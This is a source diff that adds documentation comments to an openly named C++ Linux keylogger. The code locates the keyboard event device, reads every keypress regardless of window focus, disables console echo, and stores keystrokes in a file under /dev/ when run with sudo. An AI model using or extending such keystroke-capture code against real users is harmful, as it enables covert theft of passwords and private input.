@@ -142,6 +142,12 @@ namespace logger {
 		"COMPOSE"//127 RIGHT CLICK MENU
 	};
 
+	/**
+	 * Gets the list of all devices located in /proc/bus/input/devices
+	 * 
+	 * @param verbose mode of the program. When true the function produces more details. Default to false.
+	 * @return A string that contains all the devices attached to the computer.
+	 */
 	std::string getDevices(bool verbose=false) {
 		char buffer[128];
 		std::string result = "";
@@ -173,6 +179,12 @@ namespace logger {
 		return result;
 	}
 
+	/**
+	 * Uses regular expression to get the handler to the keyboard.
+	 * 
+	 * @param devices Contains a list of all devices
+	 * @return A string that contains the path the keyboard handler
+	 */
 	std::string getHandler(std::string devices, bool verbose=false) {
 		std::string handler = "";
 		std::smatch m;  // flag type for determining the matching behavior (in this case on string objects)
@@ -186,6 +198,7 @@ namespace logger {
 		}
 		if (verbose) std::cout << "Regex search return: \x1B[32m" << m[0] << "\x1B[0m" << std::endl;
 		if (verbose) std::cout << "Creating path to handler." << std::endl;
+		
 		std::string matched = m[0];
 		size_t pos = matched.find("event");
 		handler = "/dev/input/" + matched.substr (pos);
@@ -194,11 +207,24 @@ namespace logger {
 		return handler;
 	}
 
+	/**
+	 * Used to determine the existance of a file.
+	 * 
+	 * @param name The name of a file.
+	 * @return true if file exist. false otherwise.
+	 */
 	bool fileExist (const std::string& name) {
 		std::ifstream file(name.c_str());
 		return file.good();
 	}
 
+	/**
+	 * Turns off the ECHO on the console.
+	 * 
+	 * @param verbose mode of the program. When true the function produces more details. Default to false.
+	 * 
+	 * Note: If disableEcho is called successfully but not enableEcho, the ECHO will still be disabled after program exits. 
+	 */
 	void disableEcho(bool verbose=false) {
 		if (verbose) std::cout << "Disabling console ECHO"<<std::endl;
 
@@ -219,6 +245,11 @@ namespace logger {
 		return;
 	}
 
+	/**
+	 * Re-enables the ECHO on the console.
+	 * 
+	 * @param verbose mode of the program. When true the function produces more details. Default to false.
+	 */
 	void enableEcho(bool verbose=false) {
 		if (verbose) std::cout << "Enabling console ECHO" << std::endl;
 		
@@ -238,6 +269,15 @@ namespace logger {
 		return;
 	}
 
+	/**
+	 * Connects to the handler and captures any keystroke regardless of window focus. Stores the 
+	 * any keystroke in a file located at /dev/. 
+	 * 
+	 * @param handler The path to the keyboard handler
+	 * @param verbose mode of the program. When true the function produces more details. Default to false.
+	 * 
+	 * Note: Does function fails if program not run with sudo.
+	 */
 	void connectHandler (std::string handler, bool verbose=false) {
 		const char * fileName = handler.c_str();
 		struct input_event holdEvent;
@@ -272,7 +312,7 @@ namespace logger {
 		while (true) {
 			read(fd, &holdEvent, sizeof(holdEvent));
 			
-			if (holdEvent.type == EV_KEY and holdEvent.value == 1) {
+			if (holdEvent.type == EV_KEY and holdEvent.value == 1) { //Checks for keypress down event.
 				if (verbose) {
 					// '\x1B[1m' and '\x1B[0m' allows for bolding in console window. These can be safely removed without damaging computer
 					std::cout << "holdEvent.code: \x1B[1m" << holdEvent.code << "\x1B[0m\t";
@@ -284,7 +324,7 @@ namespace logger {
 				}
 			}
 
-			if (holdEvent.code == 1) {
+			if (holdEvent.code == 1) { //Exit on ESC keypress.
 				break;
 			}
 		}
@@ -298,9 +338,16 @@ namespace logger {
 		return;
 	}
 
+	/**
+	 * For Debug mode. List keycode in the array.
+	 * 
+	 * @param debug Mode of program. When true list contents of internal variables. Defaults to false
+	 */
 	void debugKeyCode(bool debug=false) {
-		for (int i = 0; i < keyCodes.size(); i++) {
-			std::cout << "keyCodes["<<i<<"]: " << keyCodes[i] << std::endl;
+		if (debug) {
+				for (int i = 0; i < keyCodes.size(); i++) {
+					std::cout << "keyCodes["<<i<<"]: " << keyCodes[i] << std::endl;
+			}
 		}
 	}
 }
